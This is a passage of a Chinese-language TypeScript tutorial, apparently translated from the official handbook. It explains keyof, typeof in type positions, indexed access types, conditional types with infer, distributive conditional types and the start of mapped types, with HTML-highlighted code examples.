&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">c</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">createInstance</span>(<span class="title class_">Lion</span>).<span class="property">keeper</span>.<span class="property">nametag</span>;</span><br><span class="line"><span class="title function_">createInstance</span>(<span class="title class_">Bee</span>).<span class="property">keeper</span>.<span class="property">hasMask</span>;</span><br></pre></td></tr></table></figure>

<p>此模式用于为<a href="https://www.typescriptlang.org/docs/handbook/mixins.html">混合</a>设计模式提供动力。</p>
<h3 id="类型keyof运算符"><a href="#类型keyof运算符" class="headerlink" title="类型keyof运算符"></a>类型<code>keyof</code>运算符</h3><p>运算<code>keyof</code>符采用对象类型并生成其键的字符串或数字文字联合。以下类型 P 与“x” | ”y“是同一类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Point</span> = &#123; <span class="attr">x</span>: <span class="built_in">number</span>; <span class="attr">y</span>: <span class="built_in">number</span> &#125;;</span><br><span class="line"><span class="comment">// P: type p = keyof Point</span></span><br><span class="line"><span class="keyword">type</span> P = keyof <span class="title class_">Point</span>;</span><br></pre></td></tr></table></figure>

<p>如果类型有一个<code>string</code>或<code>number</code>索引签名，<code>keyof</code>将返回这些类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Arrayish</span> = &#123; [<span class="attr">n</span>: <span class="built_in">number</span>]: <span class="built_in">unknown</span> &#125;;</span><br><span class="line"><span class="comment">// type A = number</span></span><br><span class="line"><span class="keyword">type</span> A = keyof <span class="title class_">Arrayish</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Mapish</span> = &#123; [<span class="attr">k</span>: <span class="built_in">string</span>]: <span class="built_in">boolean</span> &#125;;</span><br><span class="line"><span class="comment">// type M = string | number</span></span><br><span class="line"><span class="keyword">type</span> M = keyof <span class="title class_">Mapish</span>;</span><br></pre></td></tr></table></figure>

<p>请注意，在此示例中，<code>M</code>是 <code>string | number</code>， 这是因为 JavaScript 对象键始终被强制转换为字符串，因此<code>obj[0]</code>始终转为<code>obj[&quot;0&quot;]</code>.</p>
<p><code>keyof</code>类型在与映射类型结合使用时变得特别有用，我们稍后将详细了解这一点。</p>
<h3 id="类型运算符"><a href="#类型运算符" class="headerlink" title="类型运算符"></a>类型运算符</h3><p>JavaScript 已经有一个<code>typeof</code>可以在<em>表达式</em>上下文中使用的运算符：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Prints &quot;string&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="string">&quot;Hello world&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>TypeScript 添加了一个<code>typeof</code>运算符，您可以在<em>类型</em>上下文中使用它来引用变量或属性的<em>类型：</em></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">n</span>: <span class="keyword">typeof</span> s; <span class="comment">// let n: string</span></span><br></pre></td></tr></table></figure>

<p>这对基本类型不是很有用，但结合其他类型运算符，可以<code>typeof</code>方便地表达许多模式。例如，让我们从查看预定义类型开始<code>ReturnType&lt;T&gt;</code>，它接受一个<em>函数类型</em>并产生它的返回类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Predicate</span> = <span class="function">(<span class="params">x: <span class="built_in">unknown</span></span>) =&gt;</span> <span class="built_in">boolean</span>;</span><br><span class="line"><span class="keyword">type</span> K = <span class="title class_">ReturnType</span>&lt;<span class="title class_">Predicate</span>&gt;; <span class="comment">// type K = boolean</span></span><br></pre></td></tr></table></figure>

<p><code>ReturnType</code>如果我们尝试在函数名称上使用，我们会看到一个指示性错误：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">10</span>, <span class="attr">y</span>: <span class="number">3</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> P = <span class="title class_">ReturnType</span>&lt;f&gt;; <span class="comment">// error “f”表示值，但在此处用作类型。是否指“类型 f”?</span></span><br></pre></td></tr></table></figure>

<p>请记住，<em>值</em>和<em>类型</em>不是一回事。要引用值的<em>类型</em>，我们使用：<code>f typeof</code></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">10</span>, <span class="attr">y</span>: <span class="number">3</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> P = <span class="title class_">ReturnType</span>&lt;<span class="keyword">typeof</span> f&gt;;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">type</span> P = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>TypeScript 有意限制了你可以使用的表达式种类<code>typeof</code>。</p>
<p><code>typeof</code>具体来说，<strong>只有在标识符（即变量名）或其属性上使用才是合法的</strong>。这有助于避免编写您认为正在执行但实际上不是的代码的混乱陷阱：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">msgbox</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="comment">// Meant to use = ReturnType&lt;typeof msgbox&gt;</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">shouldContinue</span>: <span class="keyword">typeof</span> <span class="title function_">msgbox</span>(<span class="string">&quot;Are you sure you want to continue?&quot;</span>); <span class="comment">// error 应为“,”。</span></span><br></pre></td></tr></table></figure>

<h3 id="索引访问类型"><a href="#索引访问类型" class="headerlink" title="索引访问类型"></a>索引访问类型</h3><p>我们可以使用<em>索引访问类型</em>来查找另一种类型的特定属性：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123; <span class="attr">age</span>: <span class="built_in">number</span>; <span class="attr">name</span>: <span class="built_in">string</span>; <span class="attr">alive</span>: <span class="built_in">boolean</span> &#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Age</span> = <span class="title class_">Person</span>[<span class="string">&quot;age&quot;</span>]; <span class="comment">// type Age = number</span></span><br></pre></td></tr></table></figure>

<p>索引类型本身就是一种类型，因此我们可以<code>keyof</code>完全使用联合、 或其他类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">I1</span> = <span class="title class_">Person</span>[<span class="string">&quot;age&quot;</span> | <span class="string">&quot;name&quot;</span>]; <span class="comment">// type I1 = string | number</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">I2</span> = <span class="title class_">Person</span>[keyof <span class="title class_">Person</span>]; <span class="comment">// type I2 = string | number | boolean</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">AliveOrName</span> = <span class="string">&quot;alive&quot;</span> | <span class="string">&quot;name&quot;</span>; </span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">I3</span> = <span class="title class_">Person</span>[<span class="title class_">AliveOrName</span>]; <span class="comment">// type I3 = string | boolean</span></span><br></pre></td></tr></table></figure>

<p>如果您尝试索引一个不存在的属性，您甚至会看到一个错误：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">I1</span> = <span class="title class_">Person</span>[<span class="string">&quot;alve&quot;</span>]; <span class="comment">// error 类型“Person”上不存在属性“alve”。</span></span><br></pre></td></tr></table></figure>

<p>使用任意类型进行索引的另一个示例是使用<code>number</code>获取数组元素的类型。我们可以将它与<code>typeof</code> 结合起来以方便地捕获数组文字的元素类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MyArray</span> = [</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>, <span class="attr">age</span>: <span class="number">15</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;Bob&quot;</span>, <span class="attr">age</span>: <span class="number">23</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;Eve&quot;</span>, <span class="attr">age</span>: <span class="number">38</span> &#125;,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = <span class="keyword">typeof</span> <span class="title class_">MyArray</span>[<span class="built_in">number</span>]; <span class="comment">// type Person = &#123;name: string;age: number;&#125;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Age</span> = <span class="keyword">typeof</span> <span class="title class_">MyArray</span>[<span class="built_in">number</span>][<span class="string">&quot;age&quot;</span>]; <span class="comment">// type Age = number</span></span><br><span class="line"><span class="comment">// Or</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Age2</span> = <span class="title class_">Person</span>[<span class="string">&quot;age&quot;</span>]; <span class="comment">// type Age2 = number</span></span><br></pre></td></tr></table></figure>

<p>您只能在索引时使用类型，这意味着您不能使用 <code>const</code>来进行变量引用：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> key = <span class="string">&quot;age&quot;</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * error </span></span><br><span class="line"><span class="comment"> * 类型“key”不能作为索引类型使用。</span></span><br><span class="line"><span class="comment"> * “key”表示值，但在此处用作类型。是否指“类型 key”?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Age</span> = <span class="title class_">Person</span>[key]; </span><br></pre></td></tr></table></figure>

<p>但是，您可以为类似风格的重构使用类型别名：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> key = <span class="string">&quot;age&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Age</span> = <span class="title class_">Person</span>[key];</span><br></pre></td></tr></table></figure>

<h3 id="条件类型"><a href="#条件类型" class="headerlink" title="条件类型"></a>条件类型</h3><p>在最有用的程序的核心，我们必须根据输入做出决定。JavaScript 程序没有什么不同，但考虑到值可以很容易地自省这一事实，这些决定也基于输入的类型。 <em>条件类型</em>有助于描述输入和输出类型之间的关系。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">live</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">woof</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Example1</span> = <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> ? <span class="built_in">number</span> : <span class="built_in">string</span>; <span class="comment">// type Example1 = number</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Example2</span> = <span class="title class_">RegExp</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> ? <span class="built_in">number</span> : <span class="built_in">string</span>; <span class="comment">// type Example2 = string</span></span><br></pre></td></tr></table></figure>

<p>条件类型的形式有点像JavaScript 中的条件表达式 (<code>condition ? trueExpression : falseExpression</code>)：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">SomeType</span> <span class="keyword">extends</span> <span class="title class_">OtherType</span> ? <span class="title class_">TrueType</span> : <span class="title class_">FalseType</span>;</span><br></pre></td></tr></table></figure>

<p>当左侧的类型<code>extends</code>可分配给右侧的类型时，您将获得第一个分支（“真实”分支）中的类型；否则你会在后一个分支（“false”分支）中得到类型。</p>
<p>从上面的示例中，条件类型可能不会立即看起来有用 - 我们可以告诉自己是否<code>Dog extends Animal</code>选择<code>number</code>or <code>string</code>！但条件类型的强大之处在于将它们与泛型一起使用。</p>
<p>例如，让我们采用以下<code>createLabel</code>功能：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IdLabel</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span> <span class="comment">/* some fields */</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">NameLabel</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span> <span class="comment">/* other fields */</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createLabel</span>(<span class="params">id: <span class="built_in">number</span></span>): <span class="title class_">IdLabel</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createLabel</span>(<span class="params">name: <span class="built_in">string</span></span>): <span class="title class_">NameLabel</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createLabel</span>(<span class="params">nameOrId: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="title class_">IdLabel</span> | <span class="title class_">NameLabel</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createLabel</span>(<span class="params">nameOrId: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="title class_">IdLabel</span> | <span class="title class_">NameLabel</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">&quot;unimplemented&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>createLabel 的这些重载描述了一个 JavaScript 函数，该函数根据其输入的类型做出选择。注意几点：</p>
<ol>
<li>如果一个库必须在其 API 中一遍又一遍地做出相同类型的选择，这将变得很麻烦。</li>
<li>我们必须创建三个重载：一个用于我们<em>确定</em>类型的每种情况（一个用于<code>string</code>，一个用于<code>number</code>），一个用于最一般的情况（采用 a <code>string | number</code>）。对于每个可以处理的新类型<code>createLabel</code>，重载的数量呈指数增长。</li>
</ol>
<p>相反，我们可以将该逻辑编码为条件类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">NameOrId</span>&lt;T <span class="keyword">extends</span> <span class="built_in">number</span> | <span class="built_in">string</span>&gt; = T <span class="keyword">extends</span> <span class="built_in">number</span></span><br><span class="line">  ? <span class="title class_">IdLabel</span></span><br><span class="line">  : <span class="title class_">NameLabel</span>;</span><br></pre></td></tr></table></figure>

<p>然后我们可以使用该条件类型将我们的重载简化为没有重载的单个函数。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> createLabel&lt;T <span class="keyword">extends</span> <span class="built_in">number</span> | <span class="built_in">string</span>&gt;(<span class="attr">idOrName</span>: T): <span class="title class_">NameOrId</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">&quot;unimplemented&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> a = <span class="title function_">createLabel</span>(<span class="string">&quot;typescript&quot;</span>); <span class="comment">// let a: NameLabel</span></span><br><span class="line"><span class="keyword">let</span> b = <span class="title function_">createLabel</span>(<span class="number">2.8</span>); <span class="comment">// let b: IdLabel</span></span><br><span class="line"><span class="keyword">let</span> c = <span class="title function_">createLabel</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() ? <span class="string">&quot;hello&quot;</span> : <span class="number">42</span>); <span class="comment">// let c: NameLabel | IdLabel</span></span><br></pre></td></tr></table></figure>

<h4 id="条件类型约束"><a href="#条件类型约束" class="headerlink" title="条件类型约束"></a>条件类型约束</h4><p>通常，条件类型的检查会为我们提供一些新信息。就像使用类型保护进行缩小可以为我们提供更具体的类型一样，条件类型的真正分支将通过我们检查的类型进一步限制泛型。</p>
<p>例如，让我们采取以下内容：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MessageOf</span>&lt;T&gt; = T[<span class="string">&quot;message&quot;</span>]; <span class="comment">// error 类型“&quot;message&quot;”无法用于索引类型“T”。</span></span><br></pre></td></tr></table></figure>

<p>在此示例中，TypeScript 出错是因为<code>T</code>不知道有一个名为 的属性<code>message</code>。我们可以约束<code>T</code>，TypeScript 将不再抱怨：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MessageOf</span>&lt;T <span class="keyword">extends</span> &#123; <span class="attr">message</span>: <span class="built_in">unknown</span> &#125;&gt; = T[<span class="string">&quot;message&quot;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Email</span> &#123;</span><br><span class="line">  <span class="attr">message</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">EmailMessageContents</span> = <span class="title class_">MessageOf</span>&lt;<span class="title class_">Email</span>&gt;; <span class="comment">// type EmailMessageContents = string</span></span><br></pre></td></tr></table></figure>

<p>但是，如果我们想<code>MessageOf</code>采用任何类型，并默认为某个属性不可用<code>never</code>时怎么办？<code>message</code>我们可以通过移出约束并引入条件类型来做到这一点：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MessageOf</span>&lt;T&gt; = T <span class="keyword">extends</span> &#123; <span class="attr">message</span>: <span class="built_in">unknown</span> &#125; ? T[<span class="string">&quot;message&quot;</span>] : <span class="built_in">never</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Email</span> &#123;</span><br><span class="line">  <span class="attr">message</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">  <span class="title function_">bark</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">EmailMessageContents</span> = <span class="title class_">MessageOf</span>&lt;<span class="title class_">Email</span>&gt;; <span class="comment">// type EmailMessageContents = string</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DogMessageContents</span> = <span class="title class_">MessageOf</span>&lt;<span class="title class_">Dog</span>&gt;; <span class="comment">// type DogMessageContents = never</span></span><br></pre></td></tr></table></figure>

<p>在 true 分支中，TypeScript 知道<code>T</code> <em>将</em>有一个<code>message</code>属性。</p>
<p>作为另一个示例，我们还可以编写一个名为<code>Flatten</code>的类型，将数组类型展平为它们的元素类型，但除此之外别管它们：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Flatten</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="built_in">any</span>[] ? T[<span class="built_in">number</span>] : T;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Extracts out the element type.</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Str</span> = <span class="title class_">Flatten</span>&lt;<span class="built_in">string</span>[]&gt;; <span class="comment">// type Str = string</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Leaves the type alone.</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Num</span> = <span class="title class_">Flatten</span>&lt;<span class="built_in">number</span>&gt;; <span class="comment">// type Num = number</span></span><br></pre></td></tr></table></figure>

<p>当<code>Flatten</code>给定一个数组类型时，它使用索引<code>number</code>访问来获取 的<code>string[]</code>元素类型。否则，它只返回给定的类型。</p>
<h4 id="在条件类型中进行推断"><a href="#在条件类型中进行推断" class="headerlink" title="在条件类型中进行推断"></a>在条件类型中进行推断</h4><p>我们只是发现自己使用条件类型来应用约束，然后提取类型。这最终成为一种常见的操作，条件类型使它变得更容易。</p>
<p>条件类型为我们提供了一种方法，可以使用<code>infer</code>关键字从我们在真实分支中比较的类型进行推断。例如，我们可以推断元素类型<code>Flatten</code>而不是使用索引访问类型“手动”取出它：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Flatten</span>&lt;<span class="title class_">Type</span>&gt; = <span class="title class_">Type</span> <span class="keyword">extends</span> <span class="title class_">Array</span>&lt;infer <span class="title class_">Item</span>&gt; ? <span class="title class_">Item</span> : <span class="title class_">Type</span>;</span><br></pre></td></tr></table></figure>

<p>在这里，我们使用<code>infer</code>关键字声明性地引入一个新的泛型类型变量 named而不是指定如何在 true 分支中<code>Item</code>检索元素类型。<code>T</code>这使我们不必考虑如何深入挖掘和剖析我们感兴趣的类型的结构。</p>
<p>我们可以使用关键字编写一些有用的辅助类型别名<code>infer</code>。例如，对于简单的情况，我们可以从函数类型中提取返回类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">GetReturnType</span>&lt;<span class="title class_">Type</span>&gt; = <span class="title class_">Type</span> <span class="keyword">extends</span> (...<span class="attr">args</span>: <span class="built_in">never</span>[]) =&gt; infer <span class="title class_">Return</span></span><br><span class="line">  ? <span class="title class_">Return</span></span><br><span class="line">  : <span class="built_in">never</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Num</span> = <span class="title class_">GetReturnType</span>&lt;<span class="function">() =&gt;</span> <span class="built_in">number</span>&gt;; <span class="comment">// type Num = number</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Str</span> = <span class="title class_">GetReturnType</span>&lt;<span class="function">(<span class="params">x: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">string</span>&gt;; <span class="comment">// type Str = string</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Bools</span> = <span class="title class_">GetReturnType</span>&lt;<span class="function">(<span class="params">a: <span class="built_in">boolean</span>, b: <span class="built_in">boolean</span></span>) =&gt;</span> <span class="built_in">boolean</span>[]&gt;; <span class="comment">// type Bools = boolean[]</span></span><br></pre></td></tr></table></figure>

<p>当从具有多个调用签名的类型（例如重载函数的类型）进行推断时，将根据<em>最后一个</em>签名进行推断（这大概是最宽松的包罗万象的情况）。不可能根据参数类型列表执行重载决策。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">stringOrNum</span>(<span class="params">x: <span class="built_in">string</span></span>): <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">stringOrNum</span>(<span class="params">x: <span class="built_in">number</span></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">stringOrNum</span>(<span class="params">x: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="built_in">string</span> | <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T1</span> = <span class="title class_">ReturnType</span>&lt;<span class="keyword">typeof</span> stringOrNum&gt;; <span class="comment">// type T1 = string | number</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">stringOrNum</span>(<span class="params">x: <span class="built_in">string</span></span>): <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringOrNum</span>(<span class="params">x: <span class="built_in">number</span></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringOrNum</span>(<span class="params">x: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="built_in">string</span> | <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.5</span> ? <span class="string">&#x27;hello&#x27;</span> : <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T1</span> = <span class="title class_">ReturnType</span>&lt;<span class="keyword">typeof</span> stringOrNum&gt;; <span class="comment">// type T1 = string | number</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">t1</span>: <span class="variable constant_">T1</span> = <span class="literal">true</span> <span class="comment">// error 不能将类型“boolean”分配给类型“string”。</span></span><br></pre></td></tr></table></figure>

<p><code>Math.random()</code>是随机的，<code>const t1: T1 = true</code>可有可能<code>error 不能将类型“boolean”分配给类型“number”</code>。</p>
<h4 id="分布式条件类型"><a href="#分布式条件类型" class="headerlink" title="分布式条件类型"></a>分布式条件类型</h4><p>当条件类型作用于泛型类型时，它们在给定联合类型时变得<em>具有分配性。</em>例如，采用以下内容：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ToArray</span>&lt;<span class="title class_">Type</span>&gt; = <span class="title class_">Type</span> <span class="keyword">extends</span> <span class="built_in">any</span> ? <span class="title class_">Type</span>[] : <span class="built_in">never</span>;</span><br></pre></td></tr></table></figure>

<p>如果我们将联合类型插入到 中<code>ToArray</code>，则条件类型将应用于该联合的每个成员。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ToArray</span>&lt;<span class="title class_">Type</span>&gt; = <span class="title class_">Type</span> <span class="keyword">extends</span> <span class="built_in">any</span> ? <span class="title class_">Type</span>[] : <span class="built_in">never</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">StrArrOrNumArr</span> = <span class="title class_">ToArray</span>&lt;<span class="built_in">string</span> | <span class="built_in">number</span>&gt;; <span class="comment">// type StrArrOrNumArr = string[] | number[]</span></span><br></pre></td></tr></table></figure>

<p>这里发生的是<code>StrArrOrNumArr</code>分布在：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> | <span class="built_in">number</span>;</span><br></pre></td></tr></table></figure>

<p>并将联合的每个成员类型映射到有效的：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ToArray</span>&lt;<span class="built_in">string</span>&gt; | <span class="title class_">ToArray</span>&lt;<span class="built_in">number</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>这给我们留下了：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>[] | <span class="built_in">number</span>[];</span><br></pre></td></tr></table></figure>

<p>通常，分配性是所需的行为。<code>extends</code>为避免这种行为，您可以用方括号将关键字的每一侧括起来。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ToArrayNonDist</span>&lt;<span class="title class_">Type</span>&gt; = [<span class="title class_">Type</span>] <span class="keyword">extends</span> [<span class="built_in">any</span>] ? <span class="title class_">Type</span>[] : <span class="built_in">never</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// &#x27;StrArrOrNumArr&#x27; is no longer a union.</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">StrArrOrNumArr</span> = <span class="title class_">ToArrayNonDist</span>&lt;<span class="built_in">string</span> | <span class="built_in">number</span>&gt;; <span class="comment">// type StrArrOrNumArr = (string | number)[]</span></span><br></pre></td></tr></table></figure>

<h3 id="映射类型"><a href="#映射类型" class="headerlink" title="映射类型"></a>映射类型</h3><p>当您不想重复自己时，有时一种类型需要基于另一种类型。</p>
<p>映射类型建立在索引签名的语法之上，用于声明未提前声明的属性类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">OnlyBoolsAndHorses</span> = &#123;</span><br><span class="line">  [<span class="attr">key</span>: <span class="built_in">string</span>]: <span class="built_in">boolean</span> | <span class="title class_">Horse</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="attr">conforms</span>: <span class="title class_">OnlyBoolsAndHorses</span> = &#123;</span><br><span class="line">  <span class="attr">del</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">rodney</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>映射类型是一种通用类型，它使用<code>PropertyKeys</code>的联合（通常通过 <code>keyof</code>创建）来遍历键以创建类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">OptionsFlags</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">  [<span class="title class_">Property</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span>]: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在此示例中，<code>OptionsFlags</code>将从类型中获取所有属性<code>Type</code>并将它们的值更改为布尔值。</p>
